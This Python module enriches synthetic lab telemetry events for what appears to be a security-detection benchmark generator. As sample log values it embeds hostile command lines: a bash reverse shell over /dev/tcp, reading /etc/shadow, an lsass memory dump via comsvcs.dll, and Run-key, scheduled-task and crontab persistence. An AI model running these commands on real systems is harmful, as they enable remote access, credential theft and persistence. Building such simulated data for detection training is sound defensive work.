#!/usr/bin/env python3
"""Source-aware evidence completion for the BMB telemetry generators.

The generator builders intentionally focus on the event story.  This module
adds the surrounding evidence an analyst would expect from each sensor.  It
does not add an expected verdict or other answer key: benign and malicious
conclusions must still be derived from the observed fields.
"""

from copy import deepcopy
import hashlib
import os
import uuid

from mitre_catalog import enrich_attack_metadata


WINDOWS_PATHS = {
    "cmd.exe": r"C:\Windows\System32\cmd.exe",
    "conhost.exe": r"C:\Windows\System32\conhost.exe",
    "explorer.exe": r"C:\Windows\explorer.exe",
    "lsass.exe": r"C:\Windows\System32\lsass.exe",
    "msiexec.exe": r"C:\Windows\System32\msiexec.exe",
    "powershell.exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    "pwsh.exe": r"C:\Program Files\PowerShell\7\pwsh.exe",
    "reg.exe": r"C:\Windows\System32\reg.exe",
    "rundll32.exe": r"C:\Windows\System32\rundll32.exe",
    "schtasks.exe": r"C:\Windows\System32\schtasks.exe",
    "services.exe": r"C:\Windows\System32\services.exe",
    "svchost.exe": r"C:\Windows\System32\svchost.exe",
    "winword.exe": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
}

LINUX_PATHS = {
    "apt": "/usr/bin/apt",
    "bash": "/usr/bin/bash",
    "cat": "/usr/bin/cat",
    "chmod": "/usr/bin/chmod",
    "cron": "/usr/sbin/cron",
    "crond": "/usr/sbin/cron",
    "curl": "/usr/bin/curl",
    "dpkg": "/usr/bin/dpkg",
    "nc": "/usr/bin/nc",
    "netcat": "/usr/bin/nc",
    "python": "/usr/bin/python3",
    "python3": "/usr/bin/python3",
    "sshd": "/usr/sbin/sshd",
    "sudo": "/usr/bin/sudo",
    "systemctl": "/usr/bin/systemctl",
    "wget": "/usr/bin/wget",
}


def _stable_hex(event, purpose, length=64):
    seed = "|".join([
        str(event.get("event", {}).get("id", "")),
        str(event.get("@timestamp", "")),
        str(event.get("event", {}).get("action", "")),
        purpose,
    ])
    value = hashlib.sha256(seed.encode("utf-8")).hexdigest()
    while len(value) < length:
        value += hashlib.sha256(value.encode("utf-8")).hexdigest()
    return value[:length]


def _stable_number(event, purpose, minimum, maximum):
    value = int(_stable_hex(event, purpose, 12), 16)
    return minimum + value % (maximum - minimum + 1)


def _artifact_hex(container, algorithm, length):
    identity = (
        container.get("executable") or
        container.get("path") or
        container.get("name") or
        "unknown-artifact"
    )
    return hashlib.sha256(f"{algorithm}|{str(identity).lower()}".encode("utf-8")).hexdigest()[:length]


def _setdefault_path(document, path, value):
    current = document
    parts = path.split(".")
    for part in parts[:-1]:
        current = current.setdefault(part, {})
    current.setdefault(parts[-1], deepcopy(value))


def _process_path(name, linux=False):
    normalized = str(name or "").lower()
    if linux:
        return LINUX_PATHS.get(normalized, f"/usr/bin/{normalized or 'unknown'}")
    return WINDOWS_PATHS.get(
        normalized,
        rf"C:\Program Files\ExampleCorp\{name or 'unknown.exe'}",
    )


def _ensure_hashes(container):
    hashes = container.setdefault("hash", {})
    # A binary or file retains the same hashes across observations. Process
    # entity IDs remain event-specific and identify the individual execution.
    hashes["sha256"] = _artifact_hex(container, "sha256", 64)
    hashes["sha1"] = _artifact_hex(container, "sha1", 40)
    hashes["md5"] = _artifact_hex(container, "md5", 32)


def _ensure_process(event, source):
    process = event.get("process")
    if not isinstance(process, dict):
        return

    linux = source == "linux"
    name = process.setdefault("name", "bash" if linux else "unknown.exe")
    process.setdefault("pid", _stable_number(event, "process-pid", 1200, 62000))
    process.setdefault("entity_id", _stable_hex(event, "process-entity", 32))
    process.setdefault("executable", _process_path(name, linux=linux))
    process.setdefault("command_line", process["executable"])
    process.setdefault("working_directory", "/tmp" if linux else r"C:\Users\Public")
    process.setdefault("start", event.get("@timestamp"))
    _ensure_hashes(process)

    signed = str(name).lower() in WINDOWS_PATHS and not linux
    process.setdefault("code_signature", {
        "exists": signed,
        "trusted": signed,
        "subject_name": "Microsoft Windows" if signed else "Unsigned",
        "status": "trusted" if signed else "unsigned",
    })

    parent = process.setdefault("parent", {})
    parent_name = parent.setdefault("name", "sshd" if linux else "explorer.exe")
    parent.setdefault("pid", max(4, int(process["pid"]) - 113))
    parent.setdefault("entity_id", _stable_hex(event, "parent-entity", 32))
    parent.setdefault("executable", _process_path(parent_name, linux=linux))
    parent.setdefault("command_line", parent["executable"])
    _ensure_hashes(parent)


def _ensure_edr(event):
    action = event["event"].get("action", "")
    process = event.setdefault("process", {})
    action_context = {
        "suspicious-powershell": (
            "powershell.exe",
            "powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBFAFgA",
            "WINWORD.EXE",
        ),
        "office-macro-execution": (
            "powershell.exe",
            "powershell.exe -NoProfile -WindowStyle Hidden -File C:\\Users\\Public\\update.ps1",
            "WINWORD.EXE",
        ),
        "malware-executed": (
            "invoice_viewer.exe",
            r"C:\Users\Public\Downloads\invoice_viewer.exe /silent",
            "explorer.exe",
        ),
        "credential-dumping": (
            "rundll32.exe",
            r"rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 684 C:\ProgramData\lsass.dmp full",
            "powershell.exe",
        ),
        "registry-persistence": (
            "reg.exe",
            r'reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\Public\update.exe',
            "cmd.exe",
        ),
        "scheduled-task-created": (
            "schtasks.exe",
            r'schtasks.exe /Create /SC ONLOGON /TN "System Update" /TR C:\Users\Public\update.exe /F',
            "powershell.exe",
        ),
        "ransomware-file-encryption": (
            "encryptor.exe",
            r"C:\Users\Public\encryptor.exe --path C:\Shared --extension .locked",
            "powershell.exe",
        ),
        "network-service-scanning": (
            "powershell.exe",
            "powershell.exe -NoProfile -Command 1..254 | ForEach-Object { Test-NetConnection 10.1.20.$_ -Port 445 }",
            "explorer.exe",
        ),
        "remote-service-execution": (
            "powershell.exe",
            r"powershell.exe -NoProfile -Command Invoke-Command -ComputerName FIN-WS002 -ScriptBlock { whoami }",
            "services.exe",
        ),
    }
    for candidate, values in action_context.items():
        if candidate in action:
            process.setdefault("name", values[0])
            process.setdefault("command_line", values[1])
            process.setdefault("parent", {}).setdefault("name", values[2])
            break

    _ensure_process(event, "edr")
    host = event.get("host", {})
    event.setdefault("agent", {}).setdefault("status", "online")
    event.setdefault("endpoint", {}).update({
        "hostname": host.get("name") or host.get("hostname"),
        "sensor_status": "healthy",
        "isolation_status": "not_isolated",
        "last_checkin": event.get("@timestamp"),
        "policy": "ExampleCorp Windows Prevention",
    })
    event.setdefault("process", {}).setdefault("integrity_level", "high")

    if event["event"].get("kind") == "alert":
        file_doc = event.setdefault("file", {})
        file_doc.setdefault("name", os.path.basename(event["process"]["executable"]))
        file_doc.setdefault("path", event["process"]["executable"])
        file_doc.setdefault("extension", file_doc["name"].rsplit(".", 1)[-1])
        _ensure_hashes(file_doc)
        file_doc.setdefault("code_signature", deepcopy(event["process"]["code_signature"]))

    if "network" in event["event"].get("category", []):
        network = event.setdefault("network", {})
        network.setdefault("transport", "tcp")
        network.setdefault("protocol", "https")
        network.setdefault("direction", "egress")
        network.setdefault("bytes", _stable_number(event, "network-bytes", 900, 900000))


def _ensure_ad(event):
    action = event["event"].get("action", "")
    winlog = event.setdefault("winlog", {})
    data = winlog.setdefault("event_data", {})
    user = event.get("user", {}).get("name")
    source = event.get("source", {}).get("ip")
    data.setdefault("TargetUserName", user)
    data.setdefault("IpAddress", source)
    data.setdefault("WorkstationName", (event.get("related", {}).get("hosts") or ["UNKNOWN"])[0])
    data.setdefault("LogonType", "3")
    data.setdefault("AuthenticationPackageName", "Kerberos")
    data.setdefault("LogonProcessName", "User32" if "success" in action else "NtLmSsp")
    data.setdefault("KeyLength", "128")

    if event["event"].get("outcome") == "failure":
        data.setdefault("FailureReason", "Unknown user name or bad password")
        data.setdefault("Status", "0xC000006D")
        data.setdefault("SubStatus", "0xC000006A")
    else:
        data.setdefault("TargetLogonId", f"0x{_stable_hex(event, 'logon-id', 8)}")
        data.setdefault("ElevatedToken", "Yes" if event.get("user", {}).get("privilege") == "high" else "No")

    auth = event.setdefault("authentication", {})
    auth.setdefault("type", "kerberos" if "kerberos" in action or "dcsync" in action else "ntlm")
    auth.setdefault("result", event["event"].get("outcome"))
    auth.setdefault("logon_type", int(data["LogonType"]))
    auth.setdefault("mfa", False if event["event"].get("kind") == "alert" else True)
    auth.setdefault("session_id", data.get("TargetLogonId") or _stable_hex(event, "auth-session", 16))

    if "dcsync" in action or "replication" in action:
        event.setdefault("directory", {}).update({
            "operation": "replication_get_changes",
            "target_object": "DC=examplecorp,DC=local",
            "rights": [
                "DS-Replication-Get-Changes",
                "DS-Replication-Get-Changes-All",
            ],
            "authorized_account": False,
        })


def _ensure_database(event):
    database = event.setdefault("database", {})
    operation = str(database.get("operation") or "SELECT").upper()
    database.setdefault("name", "inclusive_platform")
    database.setdefault("operation", operation)
    database.setdefault("query", f"{operation} /* audit statement */")
    database.setdefault("query_id", _stable_hex(event, "database-query", 16))
    database.setdefault("transaction_id", _stable_hex(event, "database-transaction", 20))
    database.setdefault("duration_ms", _stable_number(event, "database-duration", 3, 8800))
    database.setdefault("rows_affected", (
        _stable_number(event, "database-rows-alert", 10000, 850000)
        if event["event"].get("kind") == "alert" and operation == "SELECT"
        else _stable_number(event, "database-rows", 0, 200)
    ))
    database.setdefault("schema", "public")
    database.setdefault("table", "users" if "injection" in event["event"].get("action", "") else "business_records")
    event.setdefault("client", {}).update({
        "application": "inclusive-webapp",
        "address": event.get("source", {}).get("ip"),
        "authenticated": True,
    })
    event.setdefault("database_audit", {}).update({
        "statement_logged": True,
        "connection_encrypted": True,
        "server_role": event.get("user", {}).get("privilege", "standard"),
        "result": event["event"].get("outcome"),
    })
    if "export" in event["event"].get("action", ""):
        event.setdefault("file", {}).update({
            "name": f"export-{_stable_hex(event, 'export', 8)}.csv",
            "path": "/var/lib/postgresql/exports/",
            "size": _stable_number(event, "export-size", 100000000, 1800000000),
        })
        _ensure_hashes(event["file"])


def _ensure_email(event):
    email = event.setdefault("email", {})
    sender = (email.get("from", {}).get("address") or ["unknown@example.test"])[0]
    recipient = (email.get("to", {}).get("address") or ["unknown@examplecorp.local"])[0]
    email.setdefault("message_id", f"<{_stable_hex(event, 'message-id', 24)}@{sender.split('@')[-1]}>")
    email.setdefault("subject", {
        "malicious-attachment": "Outstanding invoice requires review",
        "phishing": "Password expires today",
        "bec": "Urgent payment authorization",
        "malicious-link": "Shared document notification",
    }.get(event["event"].get("action"), "ExampleCorp business communication"))
    email.setdefault("direction", "inbound")
    email.setdefault("delivery_action", (
        "quarantined" if event["event"].get("outcome") == "failure" else "delivered"
    ))
    security = email.setdefault("security", {})
    security.setdefault("spf", "pass")
    security.setdefault("dkim", "pass")
    security.setdefault("dmarc", "pass")
    security.setdefault("reputation", "neutral")
    security.setdefault("sender_domain_age_days", _stable_number(event, "domain-age", 2, 3000))

    file_doc = event.get("file")
    if isinstance(file_doc, dict):
        file_doc.setdefault("path", file_doc.get("name"))
        file_doc.setdefault("size", _stable_number(event, "attachment-size", 18000, 7000000))
        _ensure_hashes(file_doc)
        file_doc.setdefault("mime_type", {
            "xlsm": "application/vnd.ms-excel.sheet.macroEnabled.12",
            "docm": "application/vnd.ms-word.document.macroEnabled.12",
            "pdf": "application/pdf",
        }.get(file_doc.get("extension"), "application/octet-stream"))
        email.setdefault("attachments", [{
            "name": file_doc.get("name"),
            "sha256": file_doc["hash"]["sha256"],
            "size": file_doc["size"],
            "mime_type": file_doc["mime_type"],
        }])

    suspicious = event["event"].get("kind") == "alert"
    email.setdefault("sandbox", {
        "status": "completed",
        "verdict": "malicious" if suspicious and security.get("reputation") == "malicious" else "clean",
        "score": 96 if suspicious and security.get("reputation") == "malicious" else 4,
        "observed_behaviors": (
            ["macro_execution", "child_process", "external_network_connection"]
            if suspicious and file_doc else []
        ),
    })
    email.setdefault("participants", {"sender": sender, "recipient": recipient})


def _ensure_linux(event):
    action = event["event"].get("action", "")
    process = event.setdefault("process", {})
    context = {
        "reverse-shell": ("bash", "bash -i >& /dev/tcp/198.51.100.24/4444 0>&1", "python3"),
        "credential-access": ("cat", "cat /etc/shadow", "sudo"),
        "cron-persistence": ("bash", "bash -c 'echo */5 * * * * /tmp/.update >> /etc/crontab'", "sudo"),
        "privilege-escalation": ("sudo", "sudo -n /usr/bin/bash -c id", "bash"),
        "ssh-bruteforce": ("sshd", "sshd: authentication attempt", "systemd"),
    }
    for candidate, values in context.items():
        if candidate in action:
            process.setdefault("name", values[0])
            process.setdefault("command_line", values[1])
            process.setdefault("parent", {}).setdefault("name", values[2])
            break
    _ensure_process(event, "linux")
    event.setdefault("auditd", {}).update({
        "record_type": "SYSCALL",
        "session": _stable_number(event, "audit-session", 1000, 90000),
        "tty": "pts/0",
        "success": event["event"].get("outcome") == "success",
        "key": "identity" if "ssh" in action else "privileged-command",
    })
    event.setdefault("user", {}).setdefault("id", str(_stable_number(event, "uid", 1000, 4999)))
    event["user"].setdefault("effective", {
        "name": "root" if "privilege" in action or "credential" in action else event["user"].get("name"),
        "id": "0" if "privilege" in action or "credential" in action else event["user"]["id"],
    })
    if "ssh" in action:
        event.setdefault("authentication", {}).update({
            "type": "publickey" if event["event"].get("outcome") == "success" else "password",
            "result": event["event"].get("outcome"),
            "failure_reason": None if event["event"].get("outcome") == "success" else "invalid password",
            "session_id": _stable_hex(event, "ssh-session", 16),
        })


def _ensure_web(event):
    action = event["event"].get("action", "")
    request = event.setdefault("http", {}).setdefault("request", {})
    response = event["http"].setdefault("response", {})
    request.setdefault("method", "GET")
    request.setdefault("bytes", _stable_number(event, "request-bytes", 180, 38000))
    request.setdefault("mime_type", "application/json" if request["method"] != "GET" else "text/html")
    response.setdefault("status_code", 403 if event["event"].get("outcome") == "failure" else 200)
    response.setdefault("bytes", (
        _stable_number(event, "response-export", 50000000, 800000000)
        if "export" in action else _stable_number(event, "response-bytes", 300, 600000)
    ))
    response.setdefault("mime_type", "text/csv" if "export" in action else "application/json")
    url = event.setdefault("url", {})
    url.setdefault("scheme", "https")
    url.setdefault("domain", "inclusive.examplecorp.local")
    url.setdefault("path", "/")
    query = url.get("query")
    url.setdefault("original", f"https://{url['domain']}{url['path']}" + (f"?{query}" if query else ""))
    event.setdefault("network", {}).update({
        "transport": "tcp",
        "protocol": "http",
        "application": "https",
        "direction": "ingress",
    })
    event.setdefault("tls", {}).update({
        "version": "1.3",
        "cipher": "TLS_AES_256_GCM_SHA384",
        "established": True,
    })
    event.setdefault("session", {}).setdefault("id", _stable_hex(event, "web-session", 32))
    event.setdefault("web_application_firewall", {}).update({
        "evaluated": True,
        "action": "blocked" if response["status_code"] in {401, 403, 429} else "allowed",
        "rule_id": f"WAF-{_stable_hex(event, 'waf-rule', 8).upper()}",
    })
    event.setdefault("user_agent", {}).setdefault("original", "Mozilla/5.0 Chrome")


def _summary(event, source):
    action = event.get("event", {}).get("action", "activity")
    user = event.get("user", {}).get("name", "unknown user")
    host = event.get("host", {}).get("name") or event.get("observer", {}).get("name") or "unknown host"
    src = event.get("source", {}).get("ip", "unknown source")
    outcome = event.get("event", {}).get("outcome", "unknown")
    details = [f"{source} observed {action}", f"user={user}", f"host={host}", f"source.ip={src}", f"outcome={outcome}"]
    campaign = event.get("attack", {}).get("campaign_id")
    technique = event.get("attack", {}).get("technique_id")
    tactic = event.get("attack", {}).get("tactic_id")
    control_status = event.get("security_control", {}).get("status")
    correlation_session = event.get("correlation", {}).get("session_id")
    if campaign:
        details.append(f"attack.campaign_id={campaign}")
    if technique:
        details.append(f"attack.technique_id={technique}")
    if tactic:
        details.append(f"attack.tactic_id={tactic}")
    if control_status:
        details.append(f"security_control.status={control_status}")
    if correlation_session:
        details.append(f"correlation.session_id={correlation_session}")
    policy = event.get("policy", {})
    change = event.get("change", {})
    if policy:
        details.append(f"policy.authorized={policy.get('authorized')}")
        details.append(f"policy.reason={policy.get('reason')}")
    if change:
        details.append(f"change.id={change.get('id')}")
        details.append(f"change.approved={change.get('approved')}")
    process = event.get("process", {})
    if process.get("command_line"):
        details.append(f"process.command_line={process['command_line']}")
    if process.get("parent", {}).get("name"):
        details.append(f"process.parent.name={process['parent']['name']}")
    if process.get("hash", {}).get("sha256"):
        details.append(f"process.hash.sha256={process['hash']['sha256']}")
    file_doc = event.get("file", {})
    if file_doc.get("hash", {}).get("sha256"):
        details.append(f"file.hash.sha256={file_doc['hash']['sha256']}")
    database = event.get("database", {})
    if database.get("query"):
        details.append(f"database.query={database['query']}")
    email = event.get("email", {})
    if email.get("delivery_action"):
        details.append(f"email.delivery_action={email['delivery_action']}")
    http = event.get("http", {})
    if http.get("response", {}).get("status_code") is not None:
        details.append(f"http.response.status_code={http['response']['status_code']}")
    return "; ".join(str(item) for item in details)


def enrich_event_evidence(event, source):
    """Return ``event`` with realistic, source-specific supporting evidence."""
    if not isinstance(event, dict):
        raise TypeError("event must be a dictionary")
    if source not in {"ad", "database", "edr", "email", "linux", "webapp"}:
        raise ValueError(f"unsupported evidence source: {source}")

    event.setdefault("event", {}).setdefault("id", str(uuid.uuid4()))
    source_enrichers = {
        "ad": _ensure_ad,
        "database": _ensure_database,
        "edr": _ensure_edr,
        "email": _ensure_email,
        "linux": _ensure_linux,
        "webapp": _ensure_web,
    }
    source_enrichers[source](event)
    enrich_attack_metadata(event)

    event["message"] = _summary(event, source)
    evidence = event.setdefault("evidence", {})
    evidence.update({
        "profile": f"bmb-{source}-context-v1",
        "provenance": "synthetic-lab-telemetry",
        "answer_key_included": False,
        "assessment_basis": "observed sensor fields only",
    })
    present = []
    for field, value in (
        ("identity", event.get("user", {}).get("name")),
        ("host", event.get("host", {}).get("name") or event.get("observer", {}).get("name")),
        ("source_ip", event.get("source", {}).get("ip")),
        ("destination_ip", event.get("destination", {}).get("ip")),
        ("process", event.get("process", {}).get("name")),
        ("process_parent", event.get("process", {}).get("parent", {}).get("name")),
        ("process_hash", event.get("process", {}).get("hash", {}).get("sha256")),
        ("file_hash", event.get("file", {}).get("hash", {}).get("sha256")),
        ("session", event.get("session", {}).get("id") or event.get("authentication", {}).get("session_id")),
    ):
        if value not in (None, "", [], {}):
            present.append(field)
    evidence["observed_context"] = present
    evidence["context_completeness"] = round(min(1.0, len(present) / 7), 2)
    event.setdefault("tags", [])
    if "evidence-context-v1" not in event["tags"]:
        event["tags"].append("evidence-context-v1")
    return event


__all__ = ["enrich_event_evidence"]
